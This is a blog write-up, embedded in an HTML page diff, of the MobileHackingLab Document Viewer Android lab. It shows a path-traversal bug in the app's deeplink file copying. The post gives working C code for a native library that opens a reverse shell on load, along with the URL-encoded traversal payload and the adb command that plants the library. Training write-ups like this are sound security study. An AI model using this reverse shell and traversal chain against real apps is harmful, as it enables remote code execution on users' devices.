@@ -1,0 +1,277 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="https://ojack69.github.io/jacks-corner/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="https://ojack69.github.io/jacks-corner/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="https://ojack69.github.io/jacks-corner/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="https://ojack69.github.io/jacks-corner/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/zoom.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/app.js" type="application/javascript"></script>
+      <script src="https://ojack69.github.io/jacks-corner/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Static Analysis After decompiling the DocumentViewer APK, I&#39;ve noticed that in the com.mobilehackinglab.documentviewer.MainActivity there&#39;s a dynamic native library loading; if a libdocviewer_pro.so is present at getApplicationContext().getFilesDir() + &#34;native-libraries&#34; + architecture, it will be loaded and the flag proFeaturesEnabled set to true. When proFeaturesEnabled is set to true …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="MobileHackingLab - Document Viewer"/>
+  <meta property="og:description" content="Static Analysis After decompiling the DocumentViewer APK, I&#39;ve noticed that in the com.mobilehackinglab.documentviewer.MainActivity there&#39;s a dynamic native library loading; if a libdocviewer_pro.so is present at getApplicationContext().getFilesDir() + &#34;native-libraries&#34; + architecture, it will be loaded and the flag proFeaturesEnabled set to true. When proFeaturesEnabled is set to true …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="https://ojack69.github.io/jacks-corner/mobile/mobilehackinglab/document-viewer.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2024-07-05 18:00:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="https://ojack69.github.io/jacks-corner/author/jack69.html">
+  <meta property="article:section" content="Mobile"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; MobileHackingLab - Document Viewer</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="https://ojack69.github.io/jacks-corner/">
+      <img src="https://ojack69.github.io/jacks-corner/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="https://ojack69.github.io/jacks-corner/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="https://ojack69.github.io/jacks-corner/">Home</a>
+
+  <a href="https://ojack69.github.io/jacks-corner/categories.html">Categories</a>
+  <a href="https://ojack69.github.io/jacks-corner/category/cheatsheet.html">Cheatsheets</a>
+  <a href="https://ojack69.github.io/jacks-corner/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="mobile/mobilehackinglab/document-viewer">MobileHackingLab - Document Viewer</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#static-analysis" title="Static Analysis">Static Analysis</a></li><li><a class="toc-href" href="#exploitation" title="Exploitation">Exploitation</a></li></ul></div>
+        </div>
+    <h2 id="static-analysis">Static Analysis</h2>
+<p>After decompiling the DocumentViewer APK, I've noticed that in the <code>com.mobilehackinglab.documentviewer.MainActivity</code> there's a dynamic native library loading; if a <code>libdocviewer_pro.so</code> is present at <code>getApplicationContext().getFilesDir() + "native-libraries" + architecture</code>, it will be loaded and the flag <code>proFeaturesEnabled</code> set to true.</p>
+<p><img alt="unsafe-dynamic-code-loading.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/unsafe-dynamic-code-loading.png"/></p>
+<p>When <code>proFeaturesEnabled</code> is set to true, the native <code>initProFeatures()</code> is invoked.</p>
+<p><img alt="dynamic-code-execution.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/dynamic-code-execution.png"/></p>
+<p>Analyzing the manifest, I noticed that the <code>MainActivity</code> has some interesting intent filters:</p>
+<p><img alt="main-activity-deeplink.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/main-activity-deeplink.png"/></p>
+<p>Analyzing the <code>MainActivity</code> code, it seems that a user can provide a PDF to be opened with the DocumentViewer app via deeplink, which intent is handled by the  <code>handleIntent()</code> method. The deeplink allows to fetch PDF from a remote source via http/https protocol.
+The provided PDF will be processed by the <code>com.mobilehackinglab.documentviewer.CopyUtil</code> class:</p>
+<p><img alt="copy-util.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/copy-util.png"/></p>
+<p>The <code>CopyUtil</code>'s class member <code>Companion</code> does not perform any validation or sanitization on the input URI; moreover, it uses the unsafe <code>getLastPathSegment()</code> function to get last URI segment (line 50) in order to use it as filename for the output file (line 55):</p>
+<p><img alt="unsafe-uri-usage.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/unsafe-uri-usage.png"/></p>
+<p>An attacker could exploit this usage of untrusted input in order to achieve a Path Traversal attack.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>The exploitation strategy will be the following:</p>
+<ol>
+<li>Generate a fake <code>libdocviewer_pro.so</code>, containing a reverse shell code.</li>
+<li>Exploit the path traversal vulnerability to copy the forged <code>libdocviewer_pro.so</code> to the <code>getApplicationContext().getFilesDir() + "native-libraries" + architecture</code> directory that will result in  the following path <code>/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/x84_64</code></li>
+<li>Reload the app so that the <code>libdocviewer_pro.so</code> gets loaded and its code ran.</li>
+</ol>
+<p>In order to complete the step 1, the following native android lib code is compiled:</p>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;jni.h&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cstdio&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;cstdlib&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="c1">  </span>
+
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;arpa/inet.h&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;netinet/in.h&gt;</span><span class="c1">  </span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="c1">  </span>
+
+<span class="c1">// remote host to "send" shell  </span>
+<span class="cp">#define REMOTE_HOST "192.168.57.1"  </span>
+<span class="cp">#define REMOTE_PORT 8090  </span>
+
+<span class="k">extern</span><span class="w"> </span><span class="s">"C"</span><span class="w"> </span><span class="n">JNIEXPORT</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="n">JNICALL</span><span class="w">  </span>
+<span class="n">Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures</span><span class="p">(</span><span class="w">  </span>
+<span class="w">        </span><span class="n">JNIEnv</span><span class="o">*</span><span class="w"> </span><span class="n">env</span><span class="p">,</span><span class="w">  </span>
+<span class="w">        </span><span class="n">jobject</span><span class="w"> </span><span class="cm">/* this */</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="p">}</span><span class="w">  </span>
+
+<span class="kt">void</span><span class="w"> </span><span class="n">__attribute__</span><span class="w"> </span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span><span class="w"> </span><span class="n">reverse_shell</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">    </span><span class="c1">// create child process with fork  </span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">fork</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
+<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">rsSocket</span><span class="p">;</span><span class="w">  </span>
+
+<span class="w">        </span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr_in</span><span class="w"> </span><span class="n">socketAddr</span><span class="p">{};</span><span class="w">  </span>
+
+<span class="w">        </span><span class="c1">// configure socket address  </span>
+<span class="w">        </span><span class="n">socketAddr</span><span class="p">.</span><span class="n">sin_family</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">AF_INET</span><span class="p">;</span><span class="w">  </span>
+<span class="w">        </span><span class="n">socketAddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">inet_addr</span><span class="p">(</span><span class="n">REMOTE_HOST</span><span class="p">);</span><span class="w">  </span>
+<span class="w">        </span><span class="n">socketAddr</span><span class="p">.</span><span class="n">sin_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">htons</span><span class="p">(</span><span class="n">REMOTE_PORT</span><span class="p">);</span><span class="w">  </span>
+
+<span class="w">        </span><span class="c1">// create socket connection  </span>
+<span class="w">        </span><span class="n">rsSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w">  </span>
+<span class="w">        </span><span class="n">connect</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">sockaddr</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="n">socketAddr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">socketAddr</span><span class="p">));</span><span class="w">  </span>
+
+<span class="w">        </span><span class="c1">// redirect std to socket  </span>
+<span class="w">        </span><span class="n">dup2</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="c1">// stdin  </span>
+<span class="w">        </span><span class="n">dup2</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"> </span><span class="c1">// stdout  </span>
+<span class="w">        </span><span class="n">dup2</span><span class="p">(</span><span class="n">rsSocket</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span><span class="w"> </span><span class="c1">// stderr  </span>
+
+<span class="w">        </span><span class="c1">// get shell        </span>
+<span class="w">        </span><span class="n">execve</span><span class="p">(</span><span class="s">"/system/bin/sh"</span><span class="p">,</span><span class="w"> </span><span class="n">nullptr</span><span class="p">,</span><span class="w"> </span><span class="n">nullptr</span><span class="p">);</span><span class="w">  </span>
+<span class="w">    </span><span class="p">}</span><span class="w">  </span>
+<span class="p">}</span>
+</code></pre></div>
+<p>In this code, the <code>initProFeatures</code> does nothing whilst the <code>reverse_shell</code> function gets executed the moment the library is loaded by the application.
+ step </p>
+<p>To exploit the path traversal vulnerability (step 2), a web server is configured to run within the following directory tree:</p>
+<p><img alt="webserver-directories-tree.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/webserver-directories-tree.png"/></p>
+<p>Then, performing an http request to the webserver as follows:
+<code>http://192.168.57.1:8000/storage/emulated/0/Download/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so</code></p>
+<p>Will result in:</p>
+<ul>
+<li>the URL-encoded <code>/</code> char in <code>%2F</code> is correctly interpreted by the web server, so the  <code>libdocviewer_pro.so</code> is correctly returned.</li>
+<li>the <code>getLastPathSegment()</code> function will return as last segment the value <code>..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so</code>.</li>
+<li>The <code>CopyUtil</code>'s <code>copyFileFromUri</code> will download the evil library and move it to the directory where it's expected to be the legit library</li>
+</ul>
+<p>This is done by running:</p>
+<div class="highlight"><pre><span></span><code>adb<span class="w"> </span>shell<span class="w"> </span>am<span class="w"> </span>start<span class="w"> </span>-a<span class="w"> </span><span class="s1">'android.intent.action.VIEW'</span><span class="w"> </span>-n<span class="w"> </span><span class="s1">'com.mobilehackinglab.documentviewer/.MainActivity'</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">'http://192.168.57.1:8000/storage/emulated/0/Download/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so'</span>
+</code></pre></div>
+<p><img alt="path-traversal-exploitation.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/path-traversal-exploitation.png"/></p>
+<p>For the last step (3), it's enough to setup a reverse shell listener and simply re-open the application:</p>
+<p><img alt="rce-reverse-shell.png" src="https://ojack69.github.io/jacks-corner/images/mobile/mobilehackinglab/document-viewer/rce-reverse-shell.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="https://ojack69.github.io/jacks-corner/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "https://ojack69.github.io/jacks-corner",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("https://ojack69.github.io/jacks-corner/theme/stork/stork.wasm")
+      stork.register("sitesearch", "https://ojack69.github.io/jacks-corner/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="https://ojack69.github.io/jacks-corner/theme/stork/stork.js"></script>
+
+</body>
+</html>
